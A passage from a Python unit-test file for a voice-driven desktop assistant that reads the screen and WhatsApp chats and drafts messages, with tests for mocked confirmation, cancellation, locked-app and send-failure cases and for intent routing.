        self.assertEqual(draft["status"], "REQUIRES_CONFIRMATION")
        self.assertEqual(draft["spoken_response"], "Ready to send 'I will be late' to Mom. Should I send it?")

        # 2. Confirmed send
        ok, send_msg = self.ui.confirm_send_message("Mom", "I will be late")
        self.assertTrue(ok)
        self.assertEqual(send_msg, "Message sent to Mom.")

        # 3. Cancel
        cancel_msg = self.ui.cancel_send_message()
        self.assertEqual(cancel_msg, "Message cancelled.")

    def test_whatsapp_message_send_when_locked(self):
        self.ui._mock_whatsapp_state = WhatsAppScreenState(
            is_open=True,
            is_locked=True
        )
        draft = self.ui.prepare_send_message("Mom", "Hello")
        self.assertEqual(draft["status"], "LOCKED")
        self.assertIn("WhatsApp is locked", draft["spoken_response"])

        ok, send_msg = self.ui.confirm_send_message("Mom", "Hello")
        self.assertFalse(ok)
        self.assertIn("WhatsApp is locked", send_msg)

    def test_whatsapp_message_send_failure_verification(self):
        self.ui._mock_whatsapp_state = WhatsAppScreenState(
            is_open=True,
            is_locked=False,
            simulate_send_failure=True
        )
        ok, send_msg = self.ui.confirm_send_message("Mom", "I will be late")
        self.assertFalse(ok)
        self.assertIn("could not confirm if the message was sent", send_msg)

    def test_command_router_ui_automation_intents(self):
        # Read screen
        r1 = self.router.route_intent("Read screen")
        self.assertEqual(r1["intent"], "AUTOMATION_READ_SCREEN")

        r2 = self.router.route_intent("What is on my screen?")
        self.assertEqual(r2["intent"], "AUTOMATION_READ_SCREEN")

        # Read chat
        r3 = self.router.route_intent("Read this chat")
        self.assertEqual(r3["intent"], "AUTOMATION_READ_CHAT")

        r4 = self.router.route_intent("Read whatsapp messages")
        self.assertEqual(r4["intent"], "AUTOMATION_READ_CHAT")

        # Open chat with contact
        r5 = self.router.route_intent("Open chat with Mom")
        self.assertEqual(r5["intent"], "AUTOMATION_OPEN_CHAT")
        self.assertEqual(r5["target"], "Mom")

        r6 = self.router.route_intent("Chat with Alex")
        self.assertEqual(r6["intent"], "AUTOMATION_OPEN_CHAT")
        self.assertEqual(r6["target"], "Alex")

        # Send message
        r7 = self.router.route_intent("Send I will be late to Mom")
        self.assertEqual(r7["intent"], "AUTOMATION_SEND_MESSAGE")
        self.assertEqual(r7["params"]["contact"], "Mom")
        self.assertEqual(r7["params"]["message"], "I will be late")

        r8 = self.router.route_intent("Send message to Mom saying I will be home soon")
        self.assertEqual(r8["intent"], "AUTOMATION_SEND_MESSAGE")
        self.assertEqual(r8["params"]["contact"], "Mom")
        self.assertEqual(r8["params"]["message"], "I will be home soon")

        r9 = self.router.route_intent("Message Alex hello there")
        self.assertEqual(r9["intent"], "AUTOMATION_SEND_MESSAGE")
        self.assertEqual(r9["params"]["contact"], "Alex")
        self.assertEqual(r9["params"]["message"], "hello there")

    def test_vision_engine_read_screen_and_chat_e2e(self):
        engine = VisionEngine(data_dir=self.temp_dir)
        try:
            # Set mock notepad content
            engine.automation.ui_automation._mock_notepad_content = "Project notes: Complete release audit"
            engine.automation.ui_automation._mock_active_window = {
                "title": "Untitled - Notepad",
                "class_name": "Notepad",
                "process_name": "notepad.exe"
            }
            resp = engine.process_user_speech_query("Read screen")
            self.assertIn("Notepad contains: 'Project notes", resp)

            # Read WhatsApp chat
            engine.automation.ui_automation._mock_whatsapp_state = WhatsAppScreenState(
                is_open=True,
                is_locked=False,
                active_chat_name="Alice",
                messages=[WhatsAppChatMessage(sender="Alice", text="Can we meet at 4?")]
            )
            resp_chat = engine.process_user_speech_query("Read this chat")
            self.assertIn("You are in chat with Alice", resp_chat)
            self.assertIn("Can we meet at 4?", resp_chat)
        finally:
            if hasattr(engine, "scheduler"):
                engine.scheduler.stop()

    def test_vision_engine_whatsapp_send_confirmation_e2e(self):
        engine = VisionEngine(data_dir=self.temp_dir)
        try:
            # 1. User says "Send I will be late to Mom"
            resp1 = engine.process_user_speech_query("Send I will be late to Mom")
            self.assertIn("Ready to send 'I will be late' to Mom. Should I send it?", resp1)
            self.assertEqual(engine.context.state, ConversationState.AWAITING_CONFIRMATION)

            # 2. User confirms with "Send it"
            resp2 = engine.process_user_speech_query("Send it")
            self.assertIn("Message sent to Mom.", resp2)

            # 3. Test cancellation flow
            resp3 = engine.process_user_speech_query("Send I will be late to Mom")
            self.assertIn("Ready to send 'I will be late' to Mom. Should I send it?", resp3)
            resp4 = engine.process_user_speech_query("Cancel message")
            self.assertIn("Message cancelled.", resp4)
        finally:
            if hasattr(engine, "scheduler"):
                engine.scheduler.stop()


if __name__ == "__main__":
    unittest.main()


